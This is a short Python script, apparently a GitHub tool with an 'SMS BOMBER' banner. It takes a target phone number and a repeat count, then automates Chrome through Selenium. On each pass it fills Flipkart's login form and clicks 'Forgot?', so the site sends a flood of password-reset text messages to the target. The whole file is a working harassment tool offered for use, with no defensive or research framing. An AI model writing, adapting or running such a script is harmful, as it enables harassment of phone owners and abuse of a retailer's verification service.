
from lib2to3.pytree import convert
import os
from selenium import webdriver
import time
from colorama import Fore,init
init(convert=True)

def cls():
    linux = "clear"
    windows = "cls"
    os.system([linux,windows][os.name=="nt"])

cls()
 



print(Fore.GREEN+"""
░██████╗███╗░░░███╗░██████╗  ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
██╔════╝████╗░████║██╔════╝  ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
╚█████╗░██╔████╔██║╚█████╗░  ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
░╚═══██╗██║╚██╔╝██║░╚═══██╗  ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
██████╔╝██║░╚═╝░██║██████╔╝  ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
╚═════╝░╚═╝░░░░░╚═╝╚═════╝░  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
                                                     -https://github.com/Terminal1337"""+Fore.RESET)
 

tyme = int(input("Enter the number of times to bomb: "))
 

mobile_number = input("Enter the Phone Number: ")

browser = webdriver.Chrome()
 
for i in range(tyme):
    browser.get('https://www.flipkart.com/account/login?ret=/')
 
    number = browser.find_element_by_xpath('//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input')
 

    number.send_keys(mobile_number)


    forgot = browser.find_element_by_link_text('Forgot?')
     

    forgot.click()
    print(Fore.GREEN+"Message Sent Successfully"+Fore.RESET)

    time.sleep(2)
     

browser.quit()
print("Thanks for Using Our Tool.Star The Repo On github")
